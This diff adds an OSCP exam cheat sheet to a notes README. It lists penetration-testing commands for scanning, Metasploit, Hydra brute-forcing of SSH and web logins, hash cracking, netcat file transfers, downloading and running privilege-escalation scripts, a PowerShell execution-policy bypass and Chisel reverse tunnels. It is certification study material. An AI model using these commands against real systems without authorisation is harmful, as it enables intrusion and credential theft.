@@ -1,3 +1,189 @@
+**oscp important commands and tools:**
+Here are some important commands and tools that are frequently used during the OSCP (Offensive Security Certified Professional) exam:
+
+Information Gathering and Scanning
+Nmap (Network Mapper)
+
+Scan for open ports and services:
+bash
+
+nmap -sC -sV -oN nmap_scan <target_IP>
+Aggressive scan with OS detection:
+bash
+
+nmap -A <target_IP>
+Netcat (nc)
+
+Open a listener:
+bash
+
+nc -lvnp <port>
+Connect to a service:
+bash
+
+nc <target_IP> <port>
+Gobuster / Dirb (Directory Bruteforcing)
+
+Gobuster for directories:
+bash
+
+gobuster dir -u http://<target_IP> -w /path/to/wordlist.txt
+Dirb basic scan:
+bash
+
+dirb http://<target_IP>
+Nikto (Web Vulnerability Scanner)
+
+Basic web scan:
+bash
+
+nikto -h http://<target_IP>
+Exploitation Tools
+Metasploit Framework
+
+Start Metasploit:
+bash
+
+msfconsole
+Search for an exploit:
+bash
+
+search <service_name>
+Set payload and target:
+bash
+
+use <exploit_name>
+set RHOST <target_IP>
+set LHOST <your_IP>
+exploit
+Searchsploit (Exploit Database)
+
+Search for an exploit:
+bash
+
+searchsploit <service/software_name>
+Password Cracking
+Hydra (Brute-force Login)
+
+Brute force SSH login:
+bash
+
+hydra -l <username> -P <password_list> ssh://<target_IP>
+Brute force HTTP forms:
+bash
+
+hydra -L <user_list> -P <password_list> <target_IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+John the Ripper (Password Cracking)
+
+Crack hashes:
+bash
+
+john --wordlist=<wordlist> <hash_file>
+Hashcat (Password Cracking)
+
+Crack hashes using a wordlist:
+bash
+
+hashcat -m <hash_type> <hash_file> <wordlist>
+File Transfers
+Python HTTP Server
+
+Start a Python HTTP server for file transfer:
+bash
+
+python3 -m http.server 8080
+Download a file using wget:
+bash
+
+wget http://<your_IP>:8080/<filename>
+Netcat (File Transfer)
+
+Send a file to a remote system:
+bash
+
+nc -lvp 4444 < <file_name>
+Receive a file:
+bash
+
+nc <your_IP> 4444 > <file_name>
+Privilege Escalation
+Linux Privilege Escalation Tools
+
+LinEnum:
+bash
+
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+LinPEAS:
+bash
+
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20230424/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+Windows Privilege Escalation Tools
+
+WinPEAS:
+bash
+
+Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/download/20230424/winPEASx64.exe -OutFile winPEASx64.exe
+PowerUp (Windows PrivEsc via PowerShell):
+powershell
+
+powershell -exec bypass
+Import-Module ./PowerUp.ps1
+Invoke-AllChecks
+Post Exploitation
+Chisel (Port Forwarding)
+
+Start server on attacking machine:
+bash
+
+./chisel server -p <port> --reverse
+Start client on victim machine (reverse tunnel):
+bash
+
+./chisel client <your_IP>:<port> R:<local_port>:<target_IP>:<target_port>
+SSH (Port Forwarding)
+
+Local port forwarding:
+bash
+
+ssh -L <local_port>:<target_IP>:<target_port> <user>@<target_IP>
+File Enumeration
+Strings (Extract printable strings)
+
+Analyze binary or file for strings:
+bash
+
+strings <file>
+Exiftool (Metadata Extraction)
+
+Extract metadata from files:
+bash
+
+exiftool <file>
+Miscellaneous
+Tcpdump (Network Sniffing)
+
+Capture packets:
+bash
+
+tcpdump -i <interface> -w <capture_file>
+Netstat (Network Connections)
+
+List open connections and listening services:
+bash
+
+netstat -antp
+Important OSCP Tips
+Manual Exploitation: Avoid over-reliance on Metasploit; use manual methods whenever possible.
+Persistence: After getting a foothold, focus on privilege escalation and lateral movement.
+Documentation: Take thorough notes and screenshots for the exam report.
+These commands and tools will cover a wide range of tasks, from reconnaissance to exploitation and post-exploitation, crucial for succeeding in the OSCP exam.
+
+/////////////////
+/n
 # OSCP
 OSCP Notes
 Vvi 1
